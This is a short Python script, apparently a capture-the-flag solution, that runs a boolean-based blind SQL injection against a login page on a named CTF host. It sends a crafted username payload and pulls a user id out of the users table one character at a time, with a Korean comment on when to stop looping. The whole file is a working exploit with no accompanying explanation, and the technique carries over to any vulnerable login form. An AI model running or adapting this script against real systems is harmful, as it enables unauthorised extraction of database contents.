import requests
import string

# Payload: " or (select ord(mid(uid,1,1)) from users limit 1,1)=ord("I") -- -

uid=""
pre_uid = ""
# a=string.printable 
a = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*()?><\{\}[]'\":;,."

print(str(chr(255)))
for i in range(1,100): # Length 구하기 귀찮을 땐 여러번 반복시키고, 현재 구한 pw와 이전 pw를 비교하여 같으면 종료시킨다.
    for j in a:
        url="http://ctf.no-named.kr:40005/login.php"
        data = {"username":"""" or (select ord(mid(uid,{_index},1)) from users limit 1,1)=ord("{_str}") -- -""".format(_index=str(i), _str=str(j)),"password":"asdf"}
        
        res=requests.post(url, data=data)
        res=res.text
        if "Wrong" not in res:
            uid += str(j)
            break
        else: pass

    if pre_uid == uid:
        break
    else:
        print(uid)
        pre_uid = uid

print("Final uid: " + uid)    